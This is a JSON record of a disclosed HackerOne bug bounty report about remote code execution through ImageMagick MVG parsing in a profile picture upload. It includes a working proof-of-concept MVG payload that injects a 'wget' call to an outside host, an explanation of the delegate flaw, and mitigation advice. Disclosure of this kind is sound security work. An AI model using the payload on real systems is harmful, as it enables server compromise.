@@ -1,0 +1,186 @@
+{
+  "id": 135072,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzUwNzI=",
+  "url": "https://hackerone.com/reports/135072",
+  "title": "RCE in profile picture upload",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-04-27T22:04:28.937Z",
+  "submitted_at": "2016-04-27T22:04:28.937Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "c666a323be94d57",
+    "url": "/c666a323be94d57",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-06-08T10:14:12.350Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-06-08T10:14:12.105Z",
+  "team_member_agreed_on_going_public_at": "2016-05-26T04:46:31.568Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Issue\n=====\nThe profile picture upload at /settings/profile/edit is vulnerable to remote code execution due to the uploaded file being passed to ImageMagick without checking whether it's an actual image. Combined with the fact that ImageMagick parses ASCII text as so called MVG (Magic Vector Graphics), this enables an attacker to trigger a newly discovered vulnerability in MVG parsing which allows for command injection.\n\nSteps to reproduce\n======\nUpload the following ASCII file as **x.gif** using the regular profile picture upload flow:\n```\npush graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'\npop graphic-context\n```\nThis executes the `wget` command and makes an HTTP request to 1.2.3.4 on port 1337.\n\nTechnical details\n======\nThe \"image\" directive in MVG allows for the usage of so called \"delegates\" which are somewhat similar to a protocol specifier in a URL: a colon-seperated (delegate,argument)-pair like e.g. \"label:SomeText\" can be specified, invoking the respective delegate handler. Custom delegates can be added as a bash-call with substitute variables in /etc/ImageMagick/delegates.xml. The handler for https-URLs uses a bash command to invoke curl which suffers from the command injection vulnerability.\n\nRecommendation\n======\nA simple fix is to check the magic values of the uploaded files and whitelist those, i.e. to only allow JPEG, GIF and PNG uploads before passing the file to ImageMagick (e.g. the `convert` utility).\nAlso, servers that do image processing should not be able to establish outbound network connections.\nThis vulnerability will be reported to ImageMagick within the next 72 hours as a detailed advisory about this and several other MVG issues is currently being drafted.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2016-06-25T04:46:31.647Z",
+  "allow_singular_disclosure_after": -316664105.92272204,
+  "singular_disclosure_allowed": true,
+  "vote_count": 32,
+  "voters": [
+    "he4am",
+    "ralamosm",
+    "thaivu",
+    "mashoud1122",
+    "sameerphad72",
+    "spam404",
+    "aryan2808",
+    "mak",
+    "zeroxyele",
+    "2026",
+    "and 22 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "135072",
+  "votes": 32,
+  "latest_disclosable_activity_at": "2016-06-08T10:14:12.376Z",
+  "severity": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T15:01:37.696659",
+    "source": "https://hackerone.com/reports/135072.json",
+    "report_id": 135072
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzUwNzI=",
+    "databaseId": "135072",
+    "title": "RCE in profile picture upload",
+    "url": "https://hackerone.com/reports/135072",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2016-06-08T10:14:12.350Z",
+    "created_at": "2016-04-27T22:04:28.937Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzcw",
+      "name": "Code Injection",
+      "external_id": "cwe-94"
+    },
+    "severity": null,
+    "reporter": {
+      "username": "c666a323be94d57"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEz",
+      "handle": "security",
+      "name": "HackerOne",
+      "url": "https://hackerone.com/security",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yODEyOQ==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2016-05-26T04:46:22.989Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzEzNTA3Mg==",
+    "_id": "135072",
+    "disclosed": true,
+    "votes": 32,
+    "latest_disclosable_activity_at": "2016-06-08T10:14:12.376Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzUwNzI=",
+      "databaseId": "135072",
+      "title": "RCE in profile picture upload",
+      "url": "https://hackerone.com/reports/135072",
+      "disclosed_at": "2016-06-08T10:14:12.350Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEz",
+      "handle": "security",
+      "name": "HackerOne",
+      "url": "https://hackerone.com/security",
+      "currency": "usd"
+    }
+  }
+}
